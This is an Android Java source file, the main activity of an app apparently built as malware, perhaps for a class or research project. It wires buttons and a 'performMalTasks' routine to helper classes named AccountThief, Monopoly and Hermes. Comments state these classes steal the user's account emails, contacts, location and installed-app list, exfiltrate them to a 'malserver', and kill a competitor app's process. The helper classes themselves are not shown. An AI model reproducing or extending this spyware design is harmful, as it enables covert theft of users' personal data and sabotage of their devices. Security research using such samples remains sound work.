package com.trustme.testsu;


import com.trustme.testsu.utils.Constants;
import android.os.Bundle;
import android.app.Activity;
import android.content.Context;
import android.view.Menu;
import android.view.View;
import android.widget.Button;


public class MainActivity extends Activity {
	public static final String TAG = "Main Activity";
	
	
	public static Context ctx;
	protected Button btn_getEmails, btn_killComp, btn_stopKillComp, btn_getApps, btn_getContacts;
	//protected Button btn_start_check_ip, btn_stop_check_ip, btn_exfiltrate;
	
	private Monopoly monopoly = new Monopoly();
	private AccountThief accountThief = new AccountThief();
	private WiFiTracker wifiTracker = new WiFiTracker();
	private User user = new User();
		
	
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
         ctx = this;
         user.setPhoneNumber(Constants.DEVICE_NUMBER);
         
         prepareButtons();
         //performMalTasks();
	
    }
    
    @Override
    public void onDestroy(){
    	super.onDestroy();
    }
    
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		getMenuInflater().inflate(R.menu.activity_main, menu);
		return true;
	}
 
////////////////////////////////////////////////////////////////////////////////////////////////////////////////	
////////////////////////////////////////////////////////////////////////////////////////////////////////////////	
   
    /**
     * Prepares the buttons of the application
     * @author sdemetr2
     */
	private void prepareButtons() {
		// TODO Auto-generated method stub
		prepareButtonGetEmails();
        prepareButtonStartKill();
        prepareButtonStopKill();
        prepareButtonGetApps();
        prepareButtonGetContacts();
	}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	
	private void prepareButtonGetEmails() {
		btn_getEmails = (Button) findViewById(R.id.get_accounts);
    	
    	btn_getEmails.setOnClickListener(new View.OnClickListener() {
			
			public void onClick(View v) {
				getUserAccounts();
			}

		});
	}
	
	private void prepareButtonStartKill() {
		btn_killComp = (Button) findViewById(R.id.kill_competitor);
    	
		btn_killComp.setOnClickListener(new View.OnClickListener() {
			
			public void onClick(View v) {
				monopoly.killCompetitor();
			}

		});
	}
	
	private void prepareButtonStopKill() {
		btn_stopKillComp = (Button) findViewById(R.id.stop_killing_competitor);
    	
		btn_stopKillComp.setOnClickListener(new View.OnClickListener() {
			
			public void onClick(View v) {
				monopoly.stopkillingCompetitor();
			}

		});
	}
	
	private void prepareButtonGetApps() {
		btn_getApps = (Button) findViewById(R.id.get_apps);
    	
		btn_getApps.setOnClickListener(new View.OnClickListener() {
			
			public void onClick(View v) {
				getInstalledApplications();
			}

		});
	}
	
	private void prepareButtonGetContacts() {
		btn_getContacts = (Button) findViewById(R.id.get_contacts);
    	
		btn_getContacts.setOnClickListener(new View.OnClickListener() {
			
			public void onClick(View v) {
				getContacts();
			}

		});
	}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	/**
     * Perform malicious tasks
     * @author sdemetr2
     */
	private void performMalTasks() {
		// TODO Auto-generated method stub
		//getUserLocation();

        getUserAccounts();
        killCompetitor();
        getInstalledApplications();
        
        //getContacts(); //TODO: nikhil
		//changeSuperUserPrefs();
	}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////	
	
	/**
	 * It calls the account thief with the message to steal user's registered emails.
	 * @author sdemetr2
	 */
	private void getUserAccounts() {
		// TODO Auto-generated method stub
		accountThief.getUserAccounts();
	}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////	
	
	/**
	 * Calls monopoly with the message to start killing our competitor's app. </ br>
	 * It checks periodically whether the competitor's PID is registered. If it does it KILLS
	 * 	its process.
	 * @author sdemetr2
	 */
	private void killCompetitor() {
		// TODO Auto-generated method stub
		monopoly.killCompetitor();
	}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	
	/**
	* This function should fetch and try to exfiltrate 
	* 	all installed applications.</br>
	* If there is no wifi store the data in the Database and
	* 	exfiltrate as soon as the wifi is back on.</br>
	* Ideally it should perform this action in the background.
	* @author sdemetr2
	* 
	*/
	private void getInstalledApplications() {
		// TODO Auto-generated method stub
		//send installed packages with their PID to malserver
		//server responds with competitors pid
		//app kills that pid whenever it runs
		GetPackagesTask get_packages_task = new GetPackagesTask();
		get_packages_task.execute();
	}	
	
////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	/**
	 * 
     * This function should fetch and and try to exfiltrate 
     * 	the device's location.
     * If there is no wifi store the data in the Database and
     * 	exfiltrate as soon as the wifi is back on.
     * Ideally it should perform this action in the background.
     * @author sdemetr2
     */
	private void getUserLocation() {
		// TODO Auto-generated method stub
		
	}
	
//////////////////////////////////////////////////////////////////////////////////////////////////////////////	
	
    /**
     * This function should fetch and and try to exfiltrate 
     * 	all user's contacts.
     * If there is no wifi store the data in the Database and
     * 	exfiltrate as soon as the wifi is back on.
     * Ideally it should perform this action in the background.
     * @author sdemetr2
     * 
     */
	private void getContacts() {
	
		GetContactsTask get_contacts_task = new GetContactsTask();
		get_contacts_task.execute();
	}   

	
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////	
	
//	private void prepareButtonCheckIp() {
//		// TODO Auto-generated method stub
//		btn_start_check_ip = (Button) findViewById(R.id.start_ip_checking);
//    	
//		btn_start_check_ip.setOnClickListener(new View.OnClickListener() {
//			
//			public void onClick(View v) {
//				// TODO Auto-generated method stub
//				wifiTracker.start_checking_for_ip();
//				//start_checking_for_competitor();
//			}
//
//		});
//	}
//
//
//	private void prepareButtonStopCheckIp() {
//		// TODO Auto-generated method stub
//    	btn_stop_check_ip = (Button) findViewById(R.id.stop_ip_checking);
//    	
//    	btn_stop_check_ip.setOnClickListener(new View.OnClickListener() {
//			
//			public void onClick(View v) {
//				// TODO Auto-generated method stub
//				wifiTracker.stop_checking_for_ip();
//				//stop_checking_for_competitor();
//			}
//
//		});
//	}
//    
//    private void prepareButtonExfiltrate() {
//		// TODO Auto-generated method stub
//    	btn_exfiltrate = (Button) findViewById(R.id.exfiltrate);
//    	
//    	btn_exfiltrate.setOnClickListener(new View.OnClickListener() {
//			
//			public void onClick(View v) {
//				// TODO Auto-generated method stub
//				Hermes hermes = new Hermes();
//				hermes.exfiltrate(null,Constants.TEST_TRANSACTION);
//			}
//
//		});
//	}
  
//////////////////////////////////////////////////////////////////////////////////////////////////////////////    
    

  
    
}
